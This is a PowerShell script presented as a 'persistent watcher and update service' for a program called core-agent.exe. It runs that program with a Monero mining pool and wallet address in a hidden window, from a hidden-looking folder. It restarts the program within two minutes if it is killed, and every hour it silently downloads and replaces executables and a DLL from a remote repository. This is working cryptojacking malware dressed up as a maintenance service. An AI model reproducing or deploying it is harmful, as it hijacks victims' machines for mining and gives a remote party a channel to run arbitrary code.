# Persistent Watcher & Update Service
# Purpose: Ensures the core-agent.exe is always running and checks for updates.

$agentPath = "D:\.sys_assets\core-agent.exe"
$versionPath = "D:\.sys_assets\version.txt"
$baseUrl = "https://github.com/YourUsername/sys-assets-v2/raw/main/"
$logPath = "D:\.sys_assets\watcher.log"

# Initial version setup if missing
if (-not (Test-Path $versionPath)) { "1.0.0" | Out-File -FilePath $versionPath -Encoding ascii }

while ($true) {
    # 1. Update Check (Every 1 hour)
    try {
        $remoteVersion = (New-Object System.Net.WebClient).DownloadString($baseUrl + "version.txt").Trim()
        $localVersion = (Get-Content $versionPath).Trim()
        
        if ($remoteVersion -ne $localVersion) {
            "$(Get-Date): Update detected ($remoteVersion). Updating..." | Out-File -FilePath $logPath -Append
            
            # Stop existing process
            Stop-Process -Name "core-agent" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 5
            
            # Download new files
            $files = @("core-agent.exe", "ComputeEngine.exe", "version.dll", "config.json")
            foreach ($f in $files) {
                (New-Object System.Net.WebClient).DownloadFile($baseUrl + $f, "D:\.sys_assets\$f")
            }
            
            $remoteVersion | Out-File -FilePath $versionPath -Encoding ascii
            "$(Get-Date): Update complete." | Out-File -FilePath $logPath -Append
        }
    } catch {
        # Silent fail on network error
    }

    # 2. Process Monitoring (Every 2 minutes)
    $process = Get-Process -Name "core-agent" -ErrorAction SilentlyContinue
    if ($null -eq $process) {
        "$(Get-Date): Agent not found. Restarting..." | Out-File -FilePath $logPath -Append
        if (Test-Path $agentPath) {
            Start-Process $agentPath -ArgumentList "--pool pool.supportxmr.com:3333 --wallet 45n1w1fxPShNxUmJHFgypy1XyrCCpSx1LdDBASyHeRKA2xzkpUU9wkyay4quTAEqsZHwk1omKU3DZKpTMPCGnNzH5C7SWSy" -WindowStyle Hidden
        }
    }
    
    Start-Sleep -Seconds 120
}
